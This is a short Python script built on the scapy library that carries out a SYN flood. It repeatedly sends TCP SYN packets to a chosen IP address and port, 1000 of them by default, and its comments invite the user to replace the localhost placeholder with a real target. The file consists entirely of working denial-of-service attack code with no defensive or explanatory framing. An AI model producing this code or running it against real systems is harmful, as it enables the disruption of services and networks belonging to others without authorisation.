from scapy.all import IP, TCP, send
import time

# SYN flood attack packet
def generate_syn_flood(target_ip, target_port, count=100):
    for _ in range(count):
        packet = IP(dst=target_ip) / TCP(sport=1234, dport=target_port, flags="S")
        send(packet, verbose=False)
        time.sleep(0.01)  # Adjust the delay between packets

# Run SYN flood attack
if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with your target IP
    target_port = 5000       # Replace with your target port
    generate_syn_flood(target_ip, target_port, count=1000)  # Send 1000 SYN packets